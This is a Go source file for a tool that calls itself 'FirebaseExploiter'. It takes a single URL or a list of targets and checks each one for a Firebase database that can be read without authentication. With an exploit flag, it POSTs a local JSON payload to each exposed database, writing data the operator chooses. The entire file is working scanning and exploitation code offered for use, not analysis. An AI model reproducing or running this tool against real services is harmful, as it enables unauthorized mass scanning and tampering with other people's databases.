package main

import (
	"bufio"
	"encoding/json"
	"errors"
	"flag"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"strings"

	"github.com/fatih/color"
)

const banner = `                     
   ____                              ___    _                          
  / __/ ___  ____ __ __  ____ ___   / _ )  (_)  ___  ___ _  ____  __ __
 _\ \  / -_)/ __// // / / __// -_) / _  | / /  / _ \/ _  / / __/ / // /
/___/  \__/ \__/ \_,_/ /_/   \__/ /____/ /_/  /_//_/\_,_/ /_/    \_, / 
                                                                /___/  
					FirebaseExploiter v1.0
`

func checkJSON(url string, cmd string, exploit bool, path string) {
	startsWith := strings.HasPrefix(url, "https://")
	if !startsWith {
		url = "https://" + url
	}
	endsWith := strings.HasSuffix(url, "/")
	if !endsWith {
		url += "/"
	}
	resp, err := http.Get(url + ".json")
	if err != nil {
		color.Yellow("[-] Failed to connect " + url)
	}
	if err == nil {
		if resp.StatusCode == 200 {
			color.Red("[+] " + url + " - Firebase Possibly Vulnerable")
			if exploit {
				exploitJSON(url, path)
			}
		}
		if (resp.StatusCode != 200) && (cmd == "standalone") {
			color.Yellow("[*] " + url + " - Firebase Not Vulnerable")
		}
	}
}

func isJSON(s string) bool {
	var js interface{}
	return json.Unmarshal([]byte(s), &js) == nil
}

func exploitJSON(url string, path string) {
	_, err := os.Stat("exploit.json")
	if errors.Is(err, os.ErrNotExist) {
		color.Yellow("[-] File 'exploit.json' does not exist")
		os.Exit(-1)
	} else {
		fileContent, err := ioutil.ReadFile("exploit.json")
		if err != nil {
			color.Yellow("[-] Error reading file 'exploit.json'")
		}
		str := string(fileContent)
		if !isJSON(str) {
			color.Yellow("[-] File 'exploit.json' is not in proper JSON format")
		}
		resp, err := http.Post(url+path+".json", "application/json", strings.NewReader(str))
		if err != nil {
			color.Yellow("[-] Failed to exploit " + url + path + ".json")
		}
		if err == nil {
			if resp.StatusCode == 200 {
				color.Green("[+] Exploited URL - " + url + path + ".json")
			} else {
				color.Yellow("[*] Exploited Failed For - " + url + path + ".json")
			}
		}

	}
}

func main() {
	url := flag.String("url", "", "Target URL")
	file := flag.String("file", "", "File Path")
	exploit := flag.Bool("exploit", false, "Exploit")
	path := flag.String("path", "firebaseExploiter", "URI Path For Exploit")
	flag.Parse()
	fmt.Println(banner)
	if *url == "" && *file == "" {
		flag.PrintDefaults()
		os.Exit(-1)
	}
	if *url != "" {
		checkJSON(*url, "standalone", *exploit, *path)
	}
	if *url == "" && *file != "" {
		readFile, err := os.Open(*file)
		if err != nil {
			fmt.Println(err)
		}
		fileScanner := bufio.NewScanner(readFile)
		fileScanner.Split(bufio.ScanLines)
		for fileScanner.Scan() {
			checkJSON(fileScanner.Text(), "file", *exploit, *path)
		}
		readFile.Close()
	}
}
